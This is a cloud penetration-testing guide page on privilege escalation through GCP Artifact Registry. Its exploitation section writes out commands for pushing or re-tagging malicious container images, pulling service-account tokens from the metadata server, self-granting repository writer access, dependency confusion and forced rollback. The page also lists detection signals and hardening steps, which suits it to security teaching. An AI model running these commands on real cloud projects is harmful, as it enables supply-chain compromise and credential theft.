---
cstg_id: CSTG-GCP-ARTIFACT-REGISTRY-PRIVESC
title: "GCP Artifact Registry - Privilege Escalation"
provider: gcp
service: artifact-registry
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - artifactregistry.repositories.uploadArtifacts
  - artifactregistry.repositories.downloadArtifacts
  - artifactregistry.repositories.setIamPolicy
  - artifactregistry.repositories.getIamPolicy
  - artifactregistry.tags.create
  - artifactregistry.tags.update
  - artifactregistry.versions.delete
  - artifactregistry.repositories.create
tools:
  - gcloud CLI
  - Artifact Registry REST API
  - Docker CLI / OCI client
  - crane / skopeo
  - cosign
references:
  - https://cloud.google.com/artifact-registry/docs/access-control
  - https://cloud.google.com/iam/docs/understanding-roles#artifact-registry-roles
  - https://cloud.google.com/artifact-registry/docs/integrate-cloud-run
  - https://cloud.google.com/run/docs/securing/service-identity
  - https://cloud.google.com/artifact-registry/docs/repositories/remote-repo
  - https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
license: CC BY-SA 4.0
---

## Summary

Artifact Registry rarely grants privilege escalation through its own IAM surface alone. Instead, it is a *supply-chain pivot*: whoever controls the bytes that downstream compute pulls and executes can inherit the identity and privileges of that compute. A principal able to push or re-tag an image in a repository consumed by Cloud Run, GKE, Cloud Build, App Engine, Cloud Functions, or a Compute Engine deployment can place arbitrary code into the runtime, which then executes under the *attached service account* of that workload — frequently a far more privileged identity than the pushing principal.

There are three broad escalation paths:

1. **Image/package tampering (write -> downstream execution as the workload SA).** The classic and highest-impact path. Requires `uploadArtifacts` (or write role) on a repository whose artifacts are deployed somewhere.
2. **Repository IAM manipulation (`setIamPolicy`).** A principal with `setIamPolicy` on a repository can grant itself or others write access, widening the blast radius for path 1, or grant public access for data exposure.
3. **Remote/virtual repository abuse and dependency confusion.** Influencing what content a downstream build resolves, so an attacker-controlled package is pulled in place of the intended one.

This page assumes an assumed-breach foothold: a credential (user or service account) with some access to one or more repositories. Combine with [Enumeration](../02-services/gcp-artifact-registry-enum.md) to determine which repositories feed which workloads, and with [Persistence](../06-persistence/gcp-artifact-registry-persistence.md) to retain access after escalation.

## Prerequisites

- A foothold credential with one or more of the permissions in `required_permissions`.
- Knowledge of which compute resources pull from the target repository, and which service accounts those resources run as. Determine this by correlating repository names with:
  - Cloud Run / Functions revision image URIs (`gcloud run services describe`, `gcloud functions describe`).
  - GKE Deployment/Pod image references and the node/Workload-Identity SAs.
  - Cloud Build trigger configs and the Cloud Build SA.
  - Compute Engine instance container declarations / startup scripts.
- The ability to authenticate to the OCI or language endpoint for the repository (see Enumeration page for `docker login` / `crane auth` patterns).

## Enumeration

Before attempting escalation, confirm the linkage between a repository and a runtime, and confirm your effective permissions:

```bash
# Confirm your permissions on the repository
gcloud artifacts repositories test-iam-permissions <REPO> \
  --location=<LOCATION> --project=<PROJECT_ID> \
  --permissions=artifactregistry.repositories.uploadArtifacts,artifactregistry.repositories.setIamPolicy

# Find consumers: which Cloud Run services pull from this repo?
gcloud run services list --project=<PROJECT_ID> --format=json \
  | jq -r '.[] | {name:.metadata.name, image:.spec.template.spec.containers[].image, sa:.spec.template.spec.serviceAccountName}'

# GKE workloads referencing the repo
kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}'
```

A repository becomes an escalation vector specifically when (a) you can write to it and (b) a workload running as a more privileged SA pulls a *mutable tag* (e.g. `:latest`) from it, or redeploys on a schedule/trigger.

## Misconfigurations & Findings

- **Mutable tags consumed by production** (`:latest`, environment tags) — let a re-pushed image execute without any config change to the consumer.
- **Write access decoupled from deploy access** — a low-privilege identity holds `writer` on a repo whose images run as `roles/owner`-equivalent SAs.
- **`setIamPolicy` granted broadly** — repo-level IAM self-service enables silent privilege widening.
- **No Binary Authorization / no image signing enforcement** — nothing prevents an unsigned, tampered image from being deployed.
- **Virtual repository priority allowing public shadowing** — internal package names resolvable from a public upstream (dependency confusion).
- **Remote repository with credentialed upstream** — config readers can recover upstream credentials and poison the cache.

## Exploitation

### artifactregistry.repositories.uploadArtifacts (image/package tampering)

The core supply-chain attack. With write access to a repository consumed by compute that runs as a privileged SA, replace or re-tag an artifact so the next deployment executes attacker code under that SA's identity.

Build a malicious image (here, one that exfiltrates the runtime's metadata token on start) and overwrite the consumed tag:

```bash
gcloud auth configure-docker <LOCATION>-docker.pkg.dev

# Pull the legitimate image to preserve behaviour, then layer a payload
docker pull <LOCATION>-docker.pkg.dev/<PROJECT_ID>/<REPO>/<IMAGE>:latest
# (build a new image FROM the legit one that adds a backdoor / token exfil entrypoint)
docker build -t <LOCATION>-docker.pkg.dev/<PROJECT_ID>/<REPO>/<IMAGE>:latest .
docker push <LOCATION>-docker.pkg.dev/<PROJECT_ID>/<REPO>/<IMAGE>:latest
```

`crane` allows fast, daemonless tag manipulation — including re-pointing an existing tag at a different (attacker-built) digest without rebuilding the whole image:

```bash
crane auth login <LOCATION>-docker.pkg.dev -u oauth2accesstoken -p "$(gcloud auth print-access-token)"

# Re-tag: point :latest at an attacker-controlled digest already in the repo
crane tag <LOCATION>-docker.pkg.dev/<PROJECT_ID>/<REPO>/<IMAGE>@sha256:<EVIL_DIGEST> latest

# Or copy an attacker image over the production tag
crane copy <ATTACKER_IMG> <LOCATION>-docker.pkg.dev/<PROJECT_ID>/<REPO>/<IMAGE>:latest
```

When the consuming workload next pulls (autoscaling, redeploy, node restart, scheduled rollout, or a triggered Cloud Build), the payload runs as that workload's service account. From inside the container, harvest the access token from the metadata server and pivot:

```bash
# Inside the compromised runtime
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
```

The recovered token then carries the full privileges of the deployment SA — see the relevant compute-service and IAM privilege-escalation pages for onward movement. To force an immediate pull rather than waiting, an attacker with deploy permissions can redeploy the same tag (`gcloud run services update --image ...:latest`), but even without that, normal operational churn will eventually pull the poisoned tag.

The same principle applies to non-container formats: publishing a malicious version of a Maven/npm/Python/Go package that a build consumes leads to code execution in that build's environment (the Cloud Build SA), which typically holds broad project permissions.

### artifactregistry.repositories.setIamPolicy (repository IAM takeover)

A principal with `setIamPolicy` on a repository can escalate by granting itself (or a controlled identity) write/admin on that repository, then proceeding with the tampering path above; or by granting read to widen data access.

```bash
# Read current policy
gcloud artifacts repositories get-iam-policy <REPO> \
  --location=<LOCATION> --project=<PROJECT_ID> --format=json > policy.json

# Grant a controlled principal write access
gcloud artifacts repositories add-iam-policy-binding <REPO> \
  --location=<LOCATION> --project=<PROJECT_ID> \
  --member="serviceAccount:<CONTROLLED_SA>@<PROJECT_ID>.iam.gserviceaccount.com" \
  --role="roles/artifactregistry.writer"
```

REST equivalent:

```bash
curl -s -X POST -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" -d @newpolicy.json \
  "https://artifactregistry.googleapis.com/v1/projects/<PROJECT_ID>/locations/<LOCATION>/repositories/<REPO>:setIamPolicy"
```

Note: `setIamPolicy` at the repository level only widens access within Artifact Registry. It is not itself a tenant-wide escalation — its value is enabling or amplifying the image-tampering path. Project-level `setIamPolicy` (a separate, much higher-impact permission) is covered under the project IAM privilege-escalation pages.

### artifactregistry.repositories.create + remote/virtual repository abuse (dependency confusion)

With `artifactregistry.repositories.create` (or write access to an existing virtual repository's upstream configuration), an attacker can influence dependency resolution for downstream builds:

```bash
# Create a standard repo and publish a package using an internal name
gcloud artifacts repositories create evil \
  --repository-format=python --location=<LOCATION> --project=<PROJECT_ID>
```

If a virtual repository aggregates this (or an external public) upstream at higher priority than the legitimate internal repository, builds resolving an internal package name may pull the attacker's malicious version, achieving code execution in the build environment. Remote repositories that proxy a public registry can also be poisoned at the cache layer, or have their stored upstream credentials recovered if the reader can also read the referenced Secret Manager secret.

### artifactregistry.versions.delete + tags.update (rollback / shadowing)

Deleting a patched version and/or re-pointing a tag to an older, vulnerable digest can force consumers back onto known-exploitable code, indirectly enabling escalation through a re-introduced vulnerability:

```bash
gcloud artifacts versions delete <VERSION> \
  --package=<PACKAGE> --repository=<REPO> --location=<LOCATION> --project=<PROJECT_ID>
crane tag <LOCATION>-docker.pkg.dev/<PROJECT_ID>/<REPO>/<IMAGE>@sha256:<OLD_VULN_DIGEST> latest
```

## Detection & Logging

In **Cloud Audit Logs** (`artifactregistry.googleapis.com`):

- `SetIamPolicy` on a repository — high-signal; alert on any addition of `writer`/`repoAdmin`/`admin` or of `allUsers`/`allAuthenticatedUsers`.
- `UploadArtifact` / image push (Data Access logs) — especially a push to a production tag from an unexpected principal or IP, or a push whose digest differs from the prior tag value.
- `CreateRepository` of unexpected repositories, particularly remote/virtual repos.
- `DeleteVersion` followed by `CreateTag`/`UpdateTag` (rollback pattern).

Correlate registry pushes with subsequent deploy/pull events and with metadata-token requests from new container instances. Defenders should also watch for new service tokens being minted from the workload SA shortly after a tag changes.

```
protoPayload.serviceName="artifactregistry.googleapis.com"
protoPayload.methodName=~"(SetIamPolicy|UploadArtifact|CreateRepository|DeleteVersion)"
```

## Remediation & Hardening

- **Enforce immutable tags** for production-consumed images, and deploy by digest (`@sha256:`) rather than mutable tags so a re-tag cannot silently change what runs.
- **Enforce Binary Authorization** with attestation/signing (e.g. cosign + an attestor) so only signed, policy-approved images deploy; verify signatures at admission in GKE/Cloud Run.
- **Least privilege**: separate who can write to a repository from who can deploy from it; grant `writer` only to dedicated CI/CD SAs. Avoid handing `setIamPolicy` at the repository level to workload identities.
- **Run workloads as dedicated, minimally-privileged service accounts** so that even a poisoned image inherits little authority; avoid the default Compute Engine SA for production.
- **Lock virtual-repository priority** so internal upstreams always win over public ones; restrict who can create or modify remote/virtual repositories.
- **Enable Data Access audit logs** and alert on production-tag pushes and repo IAM changes.
- **Use VPC Service Controls** to constrain where artifacts can be pushed/pulled from.

## Tools

- **gcloud CLI** — repository IAM, `test-iam-permissions`, repository creation, version/tag management.
- **Docker CLI / crane / skopeo** — build, push, copy, and re-tag images; daemonless manipulation.
- **cosign** — signing/verification context for Binary Authorization (and for understanding signature-bypass risk).
- **Artifact Registry REST API** — scripted `setIamPolicy`, upload, and repo creation.

## References

- Artifact Registry access control — https://cloud.google.com/artifact-registry/docs/access-control
- Predefined Artifact Registry IAM roles — https://cloud.google.com/iam/docs/understanding-roles#artifact-registry-roles
- Deploying from Artifact Registry to Cloud Run — https://cloud.google.com/artifact-registry/docs/integrate-cloud-run
- Cloud Run service identity — https://cloud.google.com/run/docs/securing/service-identity
- Remote and virtual repositories — https://cloud.google.com/artifact-registry/docs/repositories/remote-repo
- GCP privilege escalation research — https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
